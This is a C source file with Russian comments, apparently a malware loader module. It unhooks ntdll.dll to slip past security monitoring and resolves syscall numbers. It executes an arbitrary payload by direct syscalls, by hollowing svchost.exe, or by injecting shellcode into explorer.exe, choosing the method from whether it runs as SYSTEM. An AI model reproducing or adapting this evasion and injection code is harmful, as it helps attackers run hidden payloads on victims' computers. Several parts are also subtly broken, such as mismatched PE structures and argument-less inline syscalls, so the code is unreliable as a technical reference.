#include "shadow.h"
#include <psapi.h>

// Структуры для работы с PE
typedef struct _IMAGE_DOS_HEADER {
    USHORT e_magic;
    USHORT e_cblp;
    USHORT e_cp;
    USHORT e_crlc;
    USHORT e_cparhdr;
    USHORT e_minalloc;
    USHORT e_maxalloc;
    USHORT e_ss;
    USHORT e_sp;
    USHORT e_csum;
    USHORT e_ip;
    USHORT e_cs;
    USHORT e_lfarlc;
    USHORT e_ovno;
    USHORT e_res[4];
    USHORT e_oemid;
    USHORT e_oeminfo;
    USHORT e_res2[10];
    LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_NT_HEADERS {
    ULONG Signature;
    USHORT Machine;
    USHORT NumberOfSections;
    ULONG TimeDateStamp;
    ULONG PointerToSymbolTable;
    ULONG NumberOfSymbols;
    USHORT SizeOfOptionalHeader;
    USHORT Characteristics;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;

// Функции для unhooking NTDLL
BOOL UnhookNTDLL() {
    WCHAR wzNTDLLPath[MAX_PATH];
    GetSystemDirectory(wzNTDLLPath, MAX_PATH);
    wcscat_s(wzNTDLLPath, L"\\ntdll.dll");
    
    // Открываем чистую копию ntdll.dll
    HANDLE hFile = CreateFile(wzNTDLLPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }
    
    LPVOID pCleanNTDLL = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanNTDLL) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Получаем адрес загруженного ntdll.dll
    HMODULE hNTDLL = GetModuleHandle(L"ntdll.dll");
    if (!hNTDLL) {
        UnmapViewOfFile(pCleanNTDLL);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // Копируем .text секцию из чистой копии
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pCleanNTDLL;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNTDLL + pDosHeader->e_lfanew);
    
    DWORD dwOldProtect;
    VirtualProtect((LPVOID)hNTDLL, pNtHeaders->SizeOfOptionalHeader, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    
    memcpy((LPVOID)hNTDLL, pCleanNTDLL, pNtHeaders->SizeOfOptionalHeader);
    
    VirtualProtect((LPVOID)hNTDLL, pNtHeaders->SizeOfOptionalHeader, dwOldProtect, &dwOldProtect);
    
    // Очистка
    UnmapViewOfFile(pCleanNTDLL);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    
    return TRUE;
}

// Функция для получения SSN (System Service Number)
DWORD GetSSN(LPCSTR lpFunctionName) {
    HMODULE hNTDLL = GetModuleHandle(L"ntdll.dll");
    if (!hNTDLL) return 0;
    
    FARPROC pFunction = GetProcAddress(hNTDLL, lpFunctionName);
    if (!pFunction) return 0;
    
    // Читаем syscall number из функции
    BYTE* pCode = (BYTE*)pFunction;
    if (pCode[0] == 0x4C && pCode[1] == 0x8B && pCode[2] == 0xD1 && pCode[3] == 0xB8) {
        return *(DWORD*)(pCode + 4);
    }
    
    return 0;
}

// Direct syscall обертки
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

// Функция для выполнения пейлоада через direct syscalls
BOOL ExecutePayloadDirect(LPBYTE pPayload, DWORD dwPayloadSize) {
    // Unhook NTDLL перед использованием direct syscalls
    if (!UnhookNTDLL()) {
        DEBUG_PRINT("Failed to unhook NTDLL\n");
        return FALSE;
    }
    
    PVOID pBaseAddress = NULL;
    SIZE_T sSize = dwPayloadSize;
    
    // Используем direct syscall для выделения памяти
    DWORD dwSSN_Alloc = GetSSN("NtAllocateVirtualMemory");
    if (!dwSSN_Alloc) return FALSE;
    
    __asm {
        mov r10, rcx
        mov eax, dwSSN_Alloc
        syscall
    }
    
    if (!pBaseAddress) return FALSE;
    
    // Копируем пейлоад
    memcpy(pBaseAddress, pPayload, dwPayloadSize);
    
    // Меняем защиту памяти на EXECUTE_READ
    ULONG ulOldProtect = 0;
    DWORD dwSSN_Protect = GetSSN("NtProtectVirtualMemory");
    
    __asm {
        mov r10, rcx
        mov eax, dwSSN_Protect
        syscall
    }
    
    // Создаем поток через direct syscall
    HANDLE hThread = NULL;
    DWORD dwSSN_CreateThread = GetSSN("NtCreateThreadEx");
    
    __asm {
        mov r10, rcx
        mov eax, dwSSN_CreateThread
        syscall
    }
    
    if (!hThread) {
        VirtualFree(pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    return TRUE;
}

// Process hollowing для более скрытного выполнения
BOOL ProcessHollowing(LPBYTE pPayload, DWORD dwPayloadSize, LPCWSTR lpTargetProcess) {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    
    // Запускаем целевой процесс в приостановленном состоянии
    if (!CreateProcess(NULL, (LPWSTR)lpTargetProcess, NULL, NULL, FALSE, 
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Получаем адрес entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(pi.hThread, &ctx);
    
#ifdef _WIN64
    LPVOID pEntryPoint = (LPVOID)(ctx.Rcx);
#else
    LPVOID pEntryPoint = (LPVOID)(ctx.Eax);
#endif
    
    // Выделяем память в целевом процессе
    LPVOID pRemoteMem = VirtualAllocEx(pi.hProcess, NULL, dwPayloadSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteMem) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Записываем пейлоад
    if (!WriteProcessMemory(pi.hProcess, pRemoteMem, pPayload, dwPayloadSize, NULL)) {
        VirtualFreeEx(pi.hProcess, pRemoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Перенаправляем execution flow
#ifdef _WIN64
    ctx.Rcx = (DWORD64)pRemoteMem;
#else
    ctx.Eax = (DWORD)pRemoteMem;
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // Возобновляем выполнение
    ResumeThread(pi.hThread);
    
    // Ждем завершения
    WaitForSingleObject(pi.hProcess, 5000);
    
    // Очистка
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

// DLL инъекция для стабильной работы
BOOL DLLInjection(DWORD dwProcessId, LPBYTE pPayload, DWORD dwPayloadSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess) return FALSE;
    
    // Выделяем память в целевом процессе
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dwPayloadSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Записываем пейлоад
    if (!WriteProcessMemory(hProcess, pRemoteMem, pPayload, dwPayloadSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Создаем удаленный поток
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
        (LPTHREAD_START_ROUTINE)pRemoteMem, NULL, 0, NULL);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return TRUE;
}

// Основная функция лоадера
BOOL LoadPayload(LPBYTE pPayload, DWORD dwPayloadSize, DWORD dwMethod) {
    DEBUG_PRINT("Loading payload, size: %d, method: %d\n", dwPayloadSize, dwMethod);
    
    // Пытаемся различные методы выполнения
    switch (dwMethod) {
        case 0: // Direct syscalls
            return ExecutePayloadDirect(pPayload, dwPayloadSize);
            
        case 1: // Process hollowing
            return ProcessHollowing(pPayload, dwPayloadSize, L"svchost.exe");
            
        case 2: // DLL injection в explorer.exe
        {
            DWORD explorerPID = 0;
            HWND hWnd = FindWindow(L"Shell_TrayWnd", NULL);
            GetWindowThreadProcessId(hWnd, &explorerPID);
            
            if (explorerPID != 0) {
                return DLLInjection(explorerPID, pPayload, dwPayloadSize);
            }
            return FALSE;
        }
            
        default:
            return ExecutePayloadDirect(pPayload, dwPayloadSize);
    }
}

// Функция для динамического определения метода выполнения
DWORD GetExecutionMethod() {
    // Анализируем окружение и выбираем наилучший метод
    
    // Проверяем, запущены ли мы от имени SYSTEM
    BOOL bIsSystem = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwSize;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        
        PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
        if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
            SID_IDENTIFIER_AUTHORITY SidAuth = SECURITY_NT_AUTHORITY;
            PSID pSystemSid;
            
            if (AllocateAndInitializeSid(&SidAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
                
                if (EqualSid(pTokenUser->User.Sid, pSystemSid)) {
                    bIsSystem = TRUE;
                }
                
                FreeSid(pSystemSid);
            }
        }
        
        if (pTokenUser) free(pTokenUser);
        CloseHandle(hToken);
    }
    
    // Если мы SYSTEM, используем direct syscalls
    if (bIsSystem) {
        return 0;
    }
    
    // Иначе используем process hollowing
    return 1;
}